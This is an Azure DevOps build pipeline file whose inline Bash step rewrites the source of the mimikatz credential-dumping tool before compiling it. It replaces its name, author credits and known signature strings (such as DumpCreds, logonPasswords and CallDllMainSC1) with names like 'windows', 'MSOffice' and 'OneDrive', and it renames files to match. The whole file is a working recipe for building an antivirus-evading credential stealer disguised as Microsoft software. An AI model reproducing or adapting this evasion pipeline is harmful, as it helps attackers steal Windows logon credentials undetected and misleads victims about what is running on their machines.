# C/C++ with GCC
# Build your C/C++ project with GCC using make.
# Add steps that publish test results, save build artifacts, deploy, and more:
# https://docs.microsoft.com/azure/devops/pipelines/apps/c-cpp/gcc

trigger:
- master

pool:
  vmImage: 'vs2015-win2012r2'

variables:
  solution: '**/*.sln'
  buildPlatform: 'x86|x64|ARM'
  buildConfiguration: 'Release'
  appxPackageDir: '$(build.artifactStagingDirectory)\AppxPackages\\'

steps:
# - task: NuGetToolInstaller@1

# - task: NuGetCommand@2
#   inputs:
#     restoreSolution: '$(solution)'
- task: Bash@3
  inputs:
    targetType: 'inline'
    script: |
      ls
      pwd
      cd ..
      ls
      pwd
      mv 1 windows
      mv windows/mimikatz windows/windows
      find windows/ -type f -print0 | xargs -0 sed -i 's/mimikatz/windows/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/WINDOWS/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/Mimikatz/Windows/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/DELPY/gweep/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/Benjamin/gweeperx/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/@gweeperx/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/creativecommons/notcommons/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/gentilkiwi/MSOffice/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/KIWI/ONEDRIVE/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/Kiwi/Onedrive/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/kiwi/onedrive/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/DumpCreds/DumpCred/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/logonPasswords/logonPassword/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/ArgumentPtr/NotTodayPal/g'
      find windows/ -type f -print0 | xargs -0 sed -i 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' 
      
      
      
      find windows/ -type f -name '*mimikatz*' | while read FILE ; do
      	newfile="$(echo ${FILE} |sed -e 's/mimikatz/windows/g')";
      	mv "${FILE}" "${newfile}";
      done
      find windows/ -type f -name '*kiwi*' | while read FILE ; do
      	newfile="$(echo ${FILE} |sed -e 's/kiwi/onedrive/g')";
      	mv "${FILE}" "${newfile}";
      done
      
      cd ./windows/windows/
      sed -i "0,/#if \!defined(_POWERKATZ)/! {0,/#if \!defined(_POWERKATZ)/ s/#if \!defined(_POWERKATZ)/\/*\r\n#if \!defined(_POWERKATZ)/}" windows.c
      sed -i "0,/#endif/! {0,/#endif/! {0,/#endif/ s/#endif/#endif\r\n*\//}}" windows.c

- task: VSBuild@1
  inputs:
    platform: 'x64'
    solution: '$(solution)'
    configuration: '$(buildConfiguration)'
    msbuildArgs: '/p:AppxBundlePlatforms="$(buildPlatform)" /p:AppxPackageDir="$(appxPackageDir)" /p:AppxBundle=Always /p:UapAppxPackageBuildMode=StoreUpload'

    